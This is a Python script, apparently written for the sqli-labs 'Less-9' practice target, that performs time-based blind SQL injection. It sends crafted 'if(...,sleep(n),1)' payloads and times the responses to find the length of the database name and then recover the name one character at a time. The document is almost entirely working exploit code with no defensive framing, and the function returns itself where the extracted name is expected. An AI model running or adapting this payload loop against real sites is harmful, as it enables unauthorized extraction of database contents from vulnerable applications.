import requests
import time
import datetime


def ascii_table():
    str_list=[]
    for i in range(32,128):
        str_list.append(chr(i))
    return str_list


def db_name(url):
    print("[-]开始测试数据库名的长度.................")
    num=0
    for i in range(20):
        start_time=time.time()
        db_length_payload=url+"' and if(length(database())=%d,sleep(5),1)--+"%i
        g=requests.get(db_length_payload)
        if time.time() - start_time > 5:
            num+=i
    print("[+]数据库长度是%d"%num)
    print("[-]开始测试数据库的名称.................")
    global database
    database=''
    str_list=ascii_table()
    for i in range(1,num+1):
        for l in str_list:
            time1=datetime.datetime.now()
            db_name_payload=url+"' and if(ord(mid(database(),%d,1))='%d',sleep(3),1)--+"%(i,ord(l))
            g=requests.get(db_name_payload)
            time2=datetime.datetime.now()
            t = (time2 - time1).seconds
            if t >= 3:
                database+=l
                break
    print("[+]数据库名是%s"%database)
    return db_name



def main():
    url = "http://172.17.0.2/Less-9/?id=1"
    db_name(url)


if __name__ == "__main__":
    main()
